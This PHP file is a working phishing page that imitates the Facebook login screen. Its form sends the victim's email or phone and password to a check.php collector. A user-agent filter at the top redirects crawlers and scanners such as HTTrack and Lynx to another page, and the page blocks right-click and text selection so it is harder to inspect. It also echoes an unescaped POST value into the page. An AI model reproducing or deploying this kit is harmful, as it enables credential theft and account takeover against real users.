<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php 
$link_grup = $_POST['link_grup'];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Facebook - Log in or signup">
<meta name="description" content="Login using your Facebook account.">
<meta property="og:description" content="Login using your Facebook account.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Facebook - Log in or signup">
<meta property="og:type" content="website">
<meta name="theme-color" content="#0078ff">
<meta property="og:image" content="img/icon-fb.png">
<title>Facebook - Log in or signup</title>
<link rel="stylesheet" href="css/fb_style.css">
<link rel="icon" href="img/icon-fb.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">

<div class="header">
</div>

<center>
<div class="language">Indonesia • Bahasa Melayu • 日本語 • <span>More...</span></div>
</center>

<div class="box">
<form action="check.php" method="post">
<input type="text" name="email" placeholder="Phone or email" required>
</br>
</br>
<input type="password" name="password" placeholder="Password" required>
<input type="hidden" name="link_grup" value="<?php echo $link_grup?>" readonly>
<button type="submit" class="btn-login">Log In</button>
</form>
<button type="button" class="btn-forgot">Forgot Password?</button>
<div class="divider">
<span>or</span>
</div>
<center>
<button type="button" class="btn-create">Create New Facebook Account</button>
</center>
</div> <!--- box --->

</div> <!--- container --->



</body>
</html>